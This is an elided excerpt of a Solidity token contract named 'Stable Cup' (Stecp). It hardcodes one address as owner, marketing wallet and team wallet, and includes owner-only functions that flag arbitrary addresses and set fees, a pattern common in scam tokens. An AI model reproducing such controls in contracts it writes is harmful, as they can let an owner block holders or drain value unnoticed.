...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xB5494995F8e0A08353A62A56a85C443c1519CbAa;
        // owner address
...
contract Stecp is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "Stable Cup";
    string private _symbol = "Stecp";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0xB5494995F8e0A08353A62A56a85C443c1519CbAa); // Marketing Address
    address payable public teamWalletAddress = payable(0xB5494995F8e0A08353A62A56a85C443c1519CbAa); // Team Address
    ...
    function setDLStecp(address addr, bool bv) external onlyOwner {
        isDL[addr] = bv;
    }

    function setDEStecp(uint256 fe) external onlyOwner {
